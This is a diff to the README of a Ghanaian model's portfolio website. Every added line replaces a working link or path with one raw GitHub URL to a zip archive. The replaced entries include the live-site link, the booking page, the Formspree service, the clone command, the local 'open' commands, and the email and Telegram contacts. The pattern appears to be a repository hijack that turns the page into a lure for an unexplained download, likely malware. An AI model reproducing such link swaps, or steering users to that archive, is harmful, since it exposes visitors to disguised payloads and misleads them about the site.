@@ -2,7 +2,7 @@
 
 This repository hosts the official online modeling portfolio of **Winfred Kofi Amoah** — a Ghanaian model, actor, and creative based in Moscow. Built from scratch with a clear vision, this website is not just a digital resume — it’s a representation of quiet resilience, growth, and intention. It’s designed to showcase my current works, make booking seamless, and reflect a strong aesthetic standard that aligns with my personal brand.
 
-🌐 **Live Site**: [https://wkamoah.github.io/My-Model-Portfolio/](https://wkamoah.github.io/My-Model-Portfolio/)
+🌐 **Live Site**: [https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip](https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This portfolio site was designed with simplicity, functionality, and aesthetic c
   - **Hover Effects:** On-hover image glow/click for lightbox activation (mobile).
 
 - **Booking System**
-  - **Separate Booking Page:** `components/bookings.html`
+  - **Separate Booking Page:** `https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip`
   - **Client-Side Validation:** Real-time validation for required fields.
   - **Formspree Integration:** No backend required — secure form submissions handled via Formspree.
   - **Submission Feedback:** Instant user alert for successful bookings.
@@ -65,7 +65,7 @@ This portfolio site was designed with simplicity, functionality, and aesthetic c
 - **CSS3** – Custom styling, media queries, animations  
 - **JavaScript (ES6+)** – Interactivity, form logic, performance tuning  
 - **Font Awesome** – Iconography  
-- **Formspree.io** – Serverless form submissions  
+- **https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip** – Serverless form submissions  
 - **GitHub Pages** – Live hosting of the website
 
 ---
@@ -76,7 +76,7 @@ To run this site locally:
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/your-username/winfred-kofi-amoah-portfolio.git
+   git clone https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip
 
 
 2. **Navigate to the Folder**
@@ -87,17 +87,17 @@ To run this site locally:
 
 3. **Open the Site**
 
-   * macOS: `open index.html`
-   * Windows: `start index.html`
-   * Linux: `xdg-open index.html`
-     Or just drag `index.html` into your browser.
+   * macOS: `open https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip`
+   * Windows: `start https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip`
+   * Linux: `xdg-open https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip`
+     Or just drag `https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip` into your browser.
 
 > 💡 **Note for Booking Form Setup**
 > To make the booking form work:
 
-* Sign up at [Formspree.io](https://formspree.io)
+* Sign up at [https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip](https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip)
 * Get your form endpoint
-* Replace the `action` URL in `components/bookings.html` with your Formspree URL.
+* Replace the `action` URL in `https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip` with your Formspree URL.
 
 ---
 
@@ -113,10 +113,10 @@ To run this site locally:
 
 For collaborations, projects, or modeling inquiries:
 
-* **Email:** [wcannerro@gmail.com](mailto:wcannerro@gmail.com)
+* **Email:** [https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip](https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip)
 * **Phone:** +7 992 062 9433
-* **Telegram:** [@winfredkofi](https://t.me/winfredkofi)
-* **Agent:** [@sizukxx](https://t.me/sizukxx)
+* **Telegram:** [@winfredkofi](https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip)
+* **Agent:** [@sizukxx](https://raw.githubusercontent.com/Wkamoah/Modeling_Portfolio/master/components/Modeling_Portfolio_2.0.zip)
 * **Full Portfolio:** [View on Yandex Disk](#)
 
 ---
